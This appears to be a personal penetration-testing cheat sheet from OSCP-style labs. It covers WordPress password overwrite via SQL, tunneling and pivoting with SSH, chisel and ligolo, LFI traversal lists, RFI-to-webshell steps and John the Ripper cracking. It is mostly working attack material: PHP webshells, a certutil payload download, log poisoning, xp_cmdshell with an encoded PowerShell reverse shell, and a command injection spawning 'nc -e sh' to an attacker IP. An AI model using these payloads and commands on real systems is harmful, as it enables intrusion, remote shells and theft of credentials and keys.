INSERT INTO wp_users(ID,user_login,user_pass) VALUES(3,"barry",MD5("password"));
```

Then take the hash of that new users password (`5f4dcc3b5aa765d61d8327deb882cf99`) and overwrite the admins passowrd with it.

```sql
update wp_users set user_pass="5f4dcc3b5aa765d61d8327deb882cf99" where ID=1;
```

---

# --------------------- Tunneling ------------------------------------ 

#### Tunnel with SOCAT
On the victim machine to be used as the tunnel run: 
- `socat -ddd TCP-LISTEN:<LISTENING_PORT>,fork TCP:<IP_ADDRESS>:<TARGET_PORT>`
Then connect via the listening port and it will forward on to the target port.
For example : `socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432`:

#### Tunnel with iptables
If we have root privileges, we could use iptables to create port forwards.
1. Check if IP forwarding is on `1` or off `0`
```
cat /proc/sys/net/ipv4/ip_forward
<n/confluence/bin$ cat /proc/sys/net/ipv4/ip_forward   
0
```
2. Enable it by switching it to `1`. `echo 1 > /proc/sys/net/ipv4/ip_forward`
	1. Or make it persistent between reboots by adding: 
		- `net.ipv4.ip_forward = 1` to the file `/etc/sysctl.conf`
3. Set up `iptables` Rules:
	- Use **PREROUTING** to capture traffic coming in on port `2222` 
	- Then **DNAT (Destination NAT)** it to the internal machine (`10.4.50.215`) on port `22`.

**(PREROUTING) Rule**

```sh
iptables -t nat -A PREROUTING -p tcp --dport <LISTENING_PORT> -j DNAT --to-destination <IP_ADDRESS>:<TARGET_PORT>
```
Like:
```sh
iptables -t nat -A PREROUTING -p tcp --dport 2345 -j DNAT --to-destination 10.4.162.215:5432
```
- **`-t nat`**: Use the **NAT table**.
- **`-A PREROUTING`**: Append a rule to the PREROUTING chain (this applies to packets as they arrive).
- **`-p tcp --dport 2222`**: Match TCP packets that are destined for port `2222`.
- **`-j DNAT --to-destination 10.4.50.215:22`**: Change the destination address and port of these packets to `10.4.50.215:22`.

**(POSTROUTING) Rule**
```sh
iptables -t nat -A POSTROUTING -p tcp -d <IP_ADDRESS> --dport <TARGET_PORT> -j MASQUERADE
```
eg:
```sh
iptables -t nat -A POSTROUTING -p tcp -d 10.4.162.215 --dport 5432 -j MASQUERADE
```
Rule explained:
- **`-A POSTROUTING`**: Append a rule to the POSTROUTING chain (this applies to packets as they leave the router).
- **`-d 10.4.50.215 --dport 22`**: Match traffic destined for `10.4.50.215` on port `22`.
- **`-j MASQUERADE`**: This ensures that the outgoing packets have the source IP address of the compromised machine (performing source NAT). This is necessary so the internal machine knows to send response packets back through the compromised machine.

#### Tunnel with Netcat and FIFO
1. Create a named pipe on the compromised machine to handle bidirectional communication
	- `mkfifo /tmp/fifo`
2. Set up two **netcat** instances, 
	 - one to handle the incoming connection from your attacker on port `2222` 
	 - one to connect to the internal target (`10.4.162.215:22`). 
	 The named pipe will serve as the bridge between these two connections.
```sh
# Forward data from the attacker to the internal target 
nc -lvp 2345 < /tmp/fifo | nc 10.4.162.215 5432 > /tmp/fifo
```
**Clean up**: Once you're done, clean up and remove the named pipe:`rm /tmp/fifo`
```sh 
nc -lvp <LISTEN_PORT> < /tmp/fifo | nc <IP_ADDRESS> <TARGET_PORT> > /tmp/fifo
```
### SSH tunneling
#### Local port forwarding  

```sh
K:> ssh -N -L <VIC_ALL_IPS>:<LISTEN_PORT>:<FORWARD_IP>:<FORWARD_PORT> UNAME@VICTIM1_IP
K:> ssh -N -L <SETTING:PART> <LOGINPART>
K:> ssh -N -L <LISTENINGSOCKET:FORWARDSOCKET> <LOGINPART>
K:> ssh -N -L 0.0.0.0:4455:172.16.139.217:445 database_admin@10.4.162.215
```

#### Send a victim hidden UI back to our local kali via ssh tunneling 
```
ssh -i id_ecdsa -L 9999:127.0.0.1:8000 anita@192.168.179.246 -p 2222   # Login via ssh  from my kali with a key and on port 2222 box to a victim machine and send back the victims port 8000 to my local port 9999  
```


#### Remote port forwarding  
1.  Enable the SSH server on our local machine. 
	1. `sudo systemctl start ssh`
2. Check that the local SSH port is open as we expected using **ss**. 
	1. `sudo ss -ntplu`
3. Once we have a reverse shell from **V1**, and ensure we have a TTY shell, 
	1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
4. Create an SSH remote port forward as part of an SSH connection back to our local machine.	We may have to explicity allow password-based authentication by setting **PasswordAuthentication** to `yes` in `/etc/ssh/sshd_config`.
	1. In this case, we want to listen on port **2345** on our Local machine (**127.0.0.1:2345**), and forward all traffic to the PostgreSQL port on PGDATABASE01 (**10.4.50.215:5432**).
  1. `ssh -N -R LISTEN-SOCKET:TARGET-SOCKET LOCALUSER@localPublicIP`
	2. `ssh -N -R <V1_LOCALCHOST>:2345:<TARGET_ONWARD>:5432 USERNAME@<LOCAL_IP>`
  3. `ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.179.4`
	When we authN , again , out terminal will hang . This is normal
5. Confirm that our remote port forward port is listening by checking if port 2345 is open on our local loopback interface: `ss -ntplu`
6. Start Probing the DB we are targeting:
	1. `SOMETOOL -h 127.0.0.1 -p 2345 -U postgres`

#### Remote Dynamic Port Forwarding ( ssh Tunneling )
From a conquerd host we can send back to started ssh server (`sudo systemctl start ssh`) a connection to a particular port eg `1080` ....
.... `ssh -N -R 1080 kali@192.168.179.231`
and then once local `proxychains` are configured....
`socks5 127.0.0.1 1080`
.... run commands locally as if we were connected to the victims network over the SOCKS connection.
`proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64`
Note: If useing proxychains with nmap we must use `nmap -sT` to do a full tcp connect scan, else it might not work.

Tunneling Opening a tunnel on a jump in between a hidden machine and attacking Kali machine 
```sh 
ssh -L <SENDER-SIDE-SOCK><RECIEVER-SIDESOCK> USER@<LOGIN-DESTINATION> -f -N   # ssh Tunneling - Structure
ssh -L <LOCAL_PUB_IP>:80:<KALI_IP>:80 kali@192.168.179.160 -f -N           # ssh Tunneling - Structure
ssh -L 172.16.139.77:80:192.168.179.160:80 kali@192.168.179.160 -f -N       # ssh Tunneling -
ssh -L 172.16.139.77:4444:192.168.179.160:443 kali@192.168.179.160 -f -N    # ssh Tunneling -
```


#### Tunneling example from OSCP B


This command logs into the 147 machine, opens a SOCKS proxy on 1080 and also two remote proxy . The 2 sockets are "Any interface `*` on 147 machine that gets traffic on port 6666 , send it on to the localhost of the logging in machine 6666"
```sh
K:> ssh administrator@192.168.179.147 -D1080 -R *:6666:localhost:6666 -R *:8888:localhost:8888                             # Ssh tunneling on OSCP B - hidden mssql back to out local listenr through socks proxy
K:> proxychains -q impacket-mssqlclient sql_svc:Dolphin1@10.10.73.148 -windows-auth                                        # Ssh tunneling on OSCP B - hidden mssql back to out local listenr through socks proxy
                                                                                                                           # Ssh tunneling on OSCP B - hidden mssql back to out local listenr through socks proxy
SQL:> EXECUTE sp_configure 'show advanced options', 1;                                                                     # Ssh tunneling on OSCP B - hidden mssql back to out local listenr through socks proxy
SQL:> RECONFIGURE                                                                                                          # Ssh tunneling on OSCP B - hidden mssql back to out local listenr through socks proxy
SQL:> EXECUTE sp_configure xp_cmdshell, 1;                                                                                 # Ssh tunneling on OSCP B - hidden mssql back to out local listenr through socks proxy
SQL:> RECONFIGURE                                                                                                          # Ssh tunneling on OSCP B - hidden mssql back to out local listenr through socks proxy
SQL:> xp_cmdshell whoami                                                                                                   # Ssh tunneling on OSCP B - hidden mssql back to out local listenr through socks proxy
BrS:> Get a powershell # 3 ENCODED payload from  https://www.revshells.com/                                                # Ssh tunneling on OSCP B - on the browser go to get a revers shell
SQL:> xp_cmdshell powershell -e <...B64_BLOB...>                                                                           # Ssh tunneling on OSCP B - hidden mssql back to out local listenr through socks proxy

```



#### meterpreter SOCKS5 PRoxy Post-Exploitation

```bash
msf6 exploit(multi/handler) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
open `proxychains.conf and add a line like socks5 127.0.0.1 1080

# run your commands
proxychains -q nmap -A  172.16.139.240
```

#### fping (Ping but a little better)
```
fping -asgq 172.16.139.0/23 | tee hosts.txt
```


## chisel ( tunneling tool) 
- https://github.com/jpillora/chisel


Download both the windows and linux versions of chisel to my local dir then share 
```
PS:> iwr -uri http://192.168.179.178:8000/chisel.exe -Outfile chisel.exe
K:# chmod a+x chisel
K:#./chisel server -p 8080 --reverse
PS:> chisel.exe client <ATTACKER_IP><S-PORT> R:<V-localport>:<V-remotehost>:<V-remoteport>
PS:> chisel.exe client 10.10.14.106:8080 R:3308:localhost:3306 R:8888:localhost:8888
```


## ssh 
Forward traffic from the local port 1234 to the remote server remote.example.com 's localhost interface
on port 22 :
```
ssh -L 1234:localhost:22 user@remote.example.com
```
When you run this command, the SSH client will establish a secure connection to the remote SSH server,
and it will **listen** for incoming connections on the **local** port `1234` . 

When a client connects to the **local** port, the SSH client will forward the connection to the **remote** server on port 22 . This allows the **local** client to access services on the remote server as if they were running on the **local** machine. 

In the scenario we are currently facing, we want to forward traffic from any given **local** port, for instance `1234` , to the port on which `PostgreSQL` is listening, namely `5432` , on the **remote** server. 

We therefore specify port `1234` to the left of localhost , and `5432` to the right, indicating the target port.
`ssh -L 1234:localhost:5432 christine@{<IP_ADDRESS>}`

### AD Tunneling with ssh
Many modern AD and Winodws now have an ssh client installed. The newever versions of ssh have the ability to enable dynamic port forwarding so yo ucan port forward from your local to restricted DC machines in the env. 
1. On local Kali start ssh **server**                                       # AD Tunneling - with ssh
	1. `sudo systemctl start ssh`                                             # AD Tunneling - Start teh sshe server on local kali
2. On local Kali configure `poxychains.conf` in  `socks5 127.0.0.1 1080`    # AD Tunneling - Local Kali configure Proxychains fopr     
3. On remote Windoow machine `ssh -R 1080 kali@<HACKER_IP> -N`           # AD Tunneling - On compromised windos start Remote port forwarding from out kali machine with -N to not give back a terminal (Just for proxying) 
4. Verify the local kali tunnel has opened on 1080 : `netstat -lnpt         # AD Tunneling - Verify the local Kali side listener
4. Then connect to the tunneld machine:
- `proxychains xfreerdp3  /u:svc-auth /p:secure_t1 /v:172.16.139.26 /d:offsec.live /smart-sizing /size:1920x1080 /tls:seclevel:0  /cert:ignore`

#### force close ports 

```
# We want to force close a port (here listening on 1080)
ss -tulnp | grep :1080              # force close ports check if the target port is being used
sudo fuser -k 1080/tcp              # force close ports fuser -k kill the port on the protocol
```
 

### Netsh (Windows native tool for port forwarding and tunleing)
- https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy

```
netsh interface portproxy add v4tov4 listenport=9001 listenaddress=192.168.179.10 connectport=445 connectaddress=192.168.179.12
```

## ligolo ( ligolo tunneling )
https://github.com/nicocha30/ligolo-ng/releases
https://docs.ligolo.ng/Quickstart/

Use ligolo tunneling to get to 10.10.191.148 which is hidden is within a corp network and will only speak to a internal machine
Need a proxy and a agent file for the right Arch; eg:
- WindowsArm64 agent
- Linuxand64Proxy
Download and extract the files on Kali                                                 # ligolo tunneling -
Transfer the Windows Agent to your windows jumphost/Foothold machine                   # ligolo tunneling -
Create a tun interface on the proxy server

1. LIGOLO tunneling - On Kali, Start the Ligolo-ng Proxy

```sh
K:> sudo ./proxy -selfcert                                          # ligolo tunneling - start Ligolo-ng proxy on Kali using self-signed certificate
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: 31E5DE70E2C5DF59E0E2E1BAF1357916AD1FA2176F302729CA269FD9A1E3983A 
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!          
CP:> agent.exe -connect <KALI-IP>:11601 -ignore-cert                                  # ligolo tunneling - start agent, connecting back to Kali’s proxy
```

2. LIGOLO tunneling - On Kali, Create & Verify a TUN Interface in the Ligolo-ng Console

```sh
K:> ligolo-ng                                                                         # ligolo tunneling - open the Ligolo-ng interactive console
ligolo-ng » interface_create --name "evil-cha"                                        # ligolo tunneling - create a TUN interface with a friendly name
CP:> agent.exe -connect 192.168.179.247:11601 -ignore-cert                             # ligolo tunneling - start on the remote side ( eg windows victim)
ligolo-ng » session                                                                   # ligolo tunneling - select your session from the list active sessions
```


3. LIGOLO tunneling - (Optional) Manually Create TUN Interface in Linux
```sh
K:>  sudo ip tuntap add dev ligolo mode tun                                           # ligolo tunneling - create a TUN interface named "ligolo"
K?:> sudo ip tuntap del dev ligolo mode tun                                           # ligolo tunneling -      (opt) If you get an error on the above run this to delete
K:>  sudo ip link set ligolo up                                                       # ligolo tunneling - bring the interface online
K?:> sudo ip route add 240.0.0.1/32 dev ligolo                                        # ligolo tunneling -      (opt) route 'magic' 240.0.0.1 via ligolo
K?:> sudo ip link set dev ligolo mtu 1250                                             # ligolo tunneling -      (opt) Set the MTU on the ligolo interface to a low value like 1250 so the packets are smaller and hopfully more stable
K:> sudo ip route add 10.10.191.0/24 dev ligolo                                       # ligolo tunneling - pivot/Route Traffic to the Hidden IP on AD (e.g. 10.10.191.146) traffic to 10.10.191.0/24 via interface 'ligolo'
K?:> sudo ip route del 240.0.0.1/32 dev ligolo                                        # ligolo tunneling -      (opt) If needed, delete any outdated route
```

4. LIGOLO tunneling - Confirm Your Ligolo Session & Remote Interfaces

```sh
ligolo-ng » session                                                                   # ligolo tunneling -      (opt) verify the Windows agent is active
ligolo-ng » ifconfig                                                                  # ligolo tunneling -      (opt) check remote machine’s interfaces
ligolo-ng » start                                                                     # ligolo tunneling - Now start the tunnel
```

### LIGOLO tunneling - Interrogate target as it if it were right here

```sh
K:> nmap 240.0.0.1                                                                    # ligolo tunneling - run some command 
K:> mysql -h 240.0.0.1 -u root --skip-ssl                                             # ligolo tunneling ... or run sql 
K:> ping 10.10.191.148                                                                # ligolo tunneling  - or ping the host deeper in the network 
```





# --------------------- END OF Tunneling ------------------------------------

----

### Monitor Traffic produced

```
sudo iptables -I INPUT 1 -s 192.168.179.149 -j ACCEPT
sudo iptables -I OUTPUT 1 -d 192.168.179.149 -j ACCEPT
sudo iptables -Z
```
 `sudo iptables -vn -L` Review the **iptables** statistics to get a clearer idea of how much traffic our scan generated. 
- **-v** option to add some verbosity to our output
- **-n** to enable numeric output, 
- **-L** to list the rules present in all chains.


## Ipsec - Pivoting 
(not required) But to block you first list all the rules with `iptables -L`



<details>
	<summary>iptables</summary>

```sh
└─# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy DROP)
target     prot opt source               destination         
DOCKER-USER  all  --  anywhere             anywhere            
DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     all  --  anywhere             anywhere            

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         

Chain DOCKER (1 references)
target     prot opt source               destination         

Chain DOCKER-ISOLATION-STAGE-1 (1 references)
target     prot opt source               destination         
DOCKER-ISOLATION-STAGE-2  all  --  anywhere             anywhere            
RETURN     all  --  anywhere             anywhere            

Chain DOCKER-ISOLATION-STAGE-2 (1 references)
target     prot opt source               destination         
DROP       all  --  anywhere             anywhere            
RETURN     all  --  anywhere             anywhere            

Chain DOCKER-USER (1 references)
target     prot opt source               destination         
RETURN     all  --  anywhere             anywhere            
```

We then will bloc kwith a command structured like:
- `iptables -A <CHAIN-TO-APPEND-TO> -d <DEST_IP> -j <JUMP-TO-CHAIN>`
- `iptables -A OUTPUT -d 10.10.10.14 -j DROP`

QQ: What does `iptables --flush` do
</details>


open `proxychains.conf` and add a line like `socks4 127.0.0.1 <MSF-SOCKS-PORT>`



## Hosts file 
Browsers only understand how to go to IPs, and if we provide them with a URL, they try to map the URL to an IP by looking into the local /etc/hosts file and the public DNS Domain Name System. If the URL is not in either, it would not know how to connect to it.
- `echo "10.129.136.91 SITE.COM" | sudo tee -a /etc/hosts`

Adding this entry in the /etc/hosts file will enable the browser to resolve the hostname SITE.COM to
the corresponding IP address & thus make the browser include the HTTP header "Host: SITE.COM" in
every HTTP request that the browser sends to this IP address, which will make the server respond with the
webpage for SITE.COM.

This is **"Name-Based Virtual hosting"**, a method for hosting multiple domain names (with separate handling of
each name) on a single server. This allows one server to share its resources, such as memory and processor
cycles, without requiring all the services to be used by the same hostname.
The web server checks the domain name provided in the Host header field of the HTTP request and sends
a response according to that.



## RFI and LFI

One of the most common files that a penetration tester might attempt to access on a Windows machine to verify LFI is the hosts file,"WINDOWS\System32\drivers\etc\hosts"
LFI snippet to look out for in php

**Note: Often (but not always) the payload is sent to the `access.log` type file** 

```
inculde("$file");      # LFI in php code which does nto sanitise the file input leading to LFI
```

##### Windows LFI
```
\windows\win.ini               # Windows LFI - start wit hthis file with absolute and relative path, then try lists with and without the drive letter eg: C: - HTB Sniper
```


Start with this list and play with the encodeings

```
Windows\system32\drivers\etc\hosts
windows\system32\license.rtf
\Windows\system32\drivers\etc\hosts
\windows\system32\license.rtf
c:\Windows\system32\drivers\etc\hosts
c:\windows\system32\license.rtf
c:\Windows\system32\drivers\etc\hosts
..\Windows\system32\drivers\etc\hosts
..\windows\system32\license.rtf
..\Windows\system32\drivers\etc\hosts
..\windows\system32\license.rtf
..\c:\Windows\system32\drivers\etc\hosts
..\c:\windows\system32\license.rtf
..\c:\Windows\system32\drivers\etc\hosts
..\..\Windows\system32\drivers\etc\hosts
..\..\windows\system32\license.rtf
..\..\Windows\system32\drivers\etc\hosts
..\..\windows\system32\license.rtf
..\..\c:\Windows\system32\drivers\etc\hosts
..\..\c:\windows\system32\license.rtf
..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\windows\system32\license.rtf
..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\windows\system32\license.rtf
..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\c:\windows\system32\license.rtf
..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\windows\system32\license.rtf
..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\windows\system32\license.rtf
..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\c:\windows\system32\license.rtf
..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\c:\windows\system32\license.rtf
..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\c:\windows\system32\license.rtf
..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\c:\windows\system32\license.rtf
..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\c:\windows\system32\license.rtf
..\..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\c:\windows\system32\license.rtf
..\..\..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\c:\windows\system32\license.rtf
..\..\..\..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\..\c:\windows\system32\license.rtf
..\..\..\..\..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\..\..\..\..\..\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\..\..\windows\system32\license.rtf
..\..\..\..\..\..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
..\..\..\..\..\..\..\..\..\..\..\c:\windows\system32\license.rtf
..\..\..\..\..\..\..\..\..\..\..\c:\Windows\system32\drivers\etc\hosts
```

This list on Linux

```
etc/passwd
/etc/passwd
../etc/passwd
../etc/passwd
../etc/passwd
../../etc/passwd
../../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
```

IF you come accross a xampe server the config file can sometime be found at `GET /site/index.php?page=file://C:/xampp/apache/conf/httpd.conf`



### A. Confirm and Characterise the Foothold (RFI) in PHP ( Offsec PG Slort)
1. **Test that `page` is include()-based**
    - Hit `index.php?page=SOMETHING-NONEXISTENT`.
    - ✅ _Pass_: You see an `include()` warning/error mentioning the path it tried to load.
2. **Test external URL inclusion**
    - Start a simple web server or netcat listener on your attacking box.
    - Set `page=http://LOCAL_IP/hola` (or similar).
    - ✅ _Pass_: You see an HTTP request from the victim to your machine (e.g. `GET /hola HTTP/1.0`).
3. **Test remote PHP execution**
    - Place a tiny PHP file on a locla python server server (e.g. `phpinfo()` or an `echo`).
Such as :
```
<?php
phpinfo();
?>
```
```
<?php
$exec = system('certutil.exe -urlcache -split -f "http://LOCAL_IP/shell.exe" shell.exe', $val);
?>
```
- Include it via `page=http://LOCAL_IP/info.php`.
- ✅ _Pass_: The response from the victim contains the output of that PHP code.
  
---

### B. Turn RFI into a Command Webshell
4. **Deploy a minimal command webshell over RFI**   
    - Host a simple script like `system($_REQUEST['cmd']);` on your server.
```
<?php
system($_REQUEST['cmd']);
?>
``` 
 
or even a webshell like [this] (https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php)
    - Include it via `page=http://LOCAL_IP/cmd.php`.
    - ✅ _Pass_: Any PHP warnings you see are now about `system()` and `cmd`, not missing include files.

5. **Verify command execution works** 
- Call the vulnerable page so that:- `page` points to your webshell script, and    - `cmd` is a **separate** parameter (using `&cmd=...`).    
- Start with harmless commands (`whoami`, `hostname`, `dir` / `ipconfig`).
- ✅ _Pass_: The output of those commands appears in the page response.


#### SSRF to LFI via Redirection
If we discover a file read but only via a trusted source , we could set up server to serve up a http redirect to something we choose such as a victim based local file. 

eg `index.php` like :

```php
<?php
header('Location: file:///Users/p4yl0ad/.ssh/id_rsa');
?>
```


In this example we will need our server to be able to run a small php server of our file giving a redirection to the file we want

From the dir of the attackers file 
```
php -S 0.0.0.0:80
```
Failing this we might need more oomf : `sudo service apache2 start` and move the `index.php` from `/var/www/html` instead
Dont forget `sudo service apache2 stop`


# LFI in PHP apps

```
curl http://192.168.120.45/?page=php://filter/convert.base64-encode/resource=index
```

```
curl http://192.168.120.209/?page=php://filter/convert.base64-encode/resource=blackdeath 
```

```
curl http://192.168.120.209/?page=php://filter/convert.base64-encode/resource=blackdeath../../index
```

```
http://192.168.128.29/?page=php://filter/convert.base64-encode/resource=login
```

```
http://192.168.128.29/?page=php://filter/convert.base64-encode/resource=index
```

```
http://192.168.128.29/?page=php://filter/convert.base64-encode/resource=upload
```

This one gets us the config file and some creds
```
http://192.168.128.29/?page=php://filter/convert.base64-encode/resource=config
```


Places to look for `index.php`

```
/var/opt/
/opt/www/
/var/www/
/usr/share/nginx/
/usr/share/nginx/html/index
```

- Some payloads : https://github.com/cyberheartmi9/PayloadsAllTheThings/blob/master/File%20Inclusion%20-%20Path%20Traversal/README.md


See LFI notes in Testing Methodolgies for me details 

Try and poison the logs by setting a dodgy user agent (Offsec DC5)
```
curl -A "<?php system(\$_GET['cmd']); ?>" 'http://IP_ADDRESS/'
```


----

# Command injection

```
captcha=require('child_process').exec('curl 192.168.45.193') 
captcha=require('child_process').exec('busybox nc 192.168.45.193 5000 -e sh')       # OSCP Prostore
```


## ftp$$
Try anon ftp login
```
ftp anonymous@10.129.80.105           # Provide any password
ftp anonymous@10.129.80.105 9999     # Login on an alternative port 9999
or
ftp <IP_ADDR> # same

ftp> ls -l
ftp> binary                         ( alt : ftp> mode bin ) 
ftp> get filename 
ftp> mget *      # Will download everything 
ftp> bye
See the file in the local dir
```

If you get issues like ...
```
ftp> ls -la
229 Entering Extended Passive Mode (|||61560|)
```
`ftp> passive` - Toggles passive mode on/off

IF annonymous get all files with wget
- `wget -r ftp://<IPADDRESS>`


```
ftp -A 192.168.xxx.53    # Enable an active session
ftp> put putty.exe       # Uploada file
ftp> bin                 # enable binary mode, is used for transferring binariers , executables etc, byte-for-byte transfer
wget -q -m ftp://anonymous:anonymous@192.168.179.127:30021 -P new-FTP   # ftp recursive download with wget on port 30021, quitely and save to new dir new-FTP
```
ftp cli alternative lftp (faster for recursive downloads but be careful as it will overwrite your dir)

```
lftp -p <PORT>> -u <USER>, ftp://<VIC_IP_ADDRESS>
lftp -p 20001 -u anonymous, ftp://192.168.179.140

lftp>  mirror -e -n -P 5 . ~/OSCP/12WP/Hepet-W/NEWFTPLOOT
lftp>  mirror -e -n -P 5 . ~/OSCP/../../NEWFTPLOOT     # ftp recursive transfer MAKE SURE TO PUT IT IN A NEW DIR ELSE IT WILL OVERWERITE EVERYTHING!!!!

```

## Telnet 

```sh
telnet <IPADDRES> <PORT>   # often the port is 23 or 25
HELO <ANY_OLD_DOMAIN>      # doesnat have to be real
250 OK			               # this means we are in
RCPT TO: <VALID_USER>      # this should be a valid email to the server in angle brackets
250 OK
RCPT TO: <INVALID_USER>     
550 unknown user                  # We can use this to bruteforece usernames
MAIL FROM: someoneunkonw@mail.com # if its a domain outside of the server it will accept it becasue it cannot verify them locally so has to trust.
250 OK
```
# PASSWORD Attacks


## John the Ripper
#### John rules
Rules - https://www.openwall.com/john/doc/RULES.shtml
Rules are in the file : `/etc/john/john.conf` where an example Rule delcation will look like:
```
...
[List.Rules:<MYRULE-NAME>]
...
[List.Rules:foo-rule]
$[0-9]$[0-9]
```
Where `foo-rule` will append 2 digits toi the end of the the string in the list. This would be executed as follows: `john hashFile.txt --wordlist=rockyou.txt --rules=foo-rule.txt 



Once we have **obtained a key FIRST WE MODIFY THE PERMISSIONS** - cracking ssh keys wth John
```
chmod 600 id_rsa # cracking ssh keys wth john
ssh2john id_rsa > ssh.hash` # cracking ssh keys wth john
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash # cracking ssh keys wth john
```
##### john cracking sha256
```
root:$SHA512$5ff837a98703011de7d0a576ca9a84be6f9e4a798329423c8200beabd0f178656591fdac53ff785e71062dd2473d6dc1bb822a7dce1fc626ee44855466f3c8e1    # john cracking sha256- File contnet of the hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                                                                                        # john cracking sha256- Cmd to run 
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::        # john cracking - Crack raw NTLM - RAW format like this  
sudo john --format=NT hash.txt                                                                # john cracking - Crack raw NTLM hashes with this format setting 
```


### MD5 cracking with john

```
john --format=Raw-MD5 hash.txt
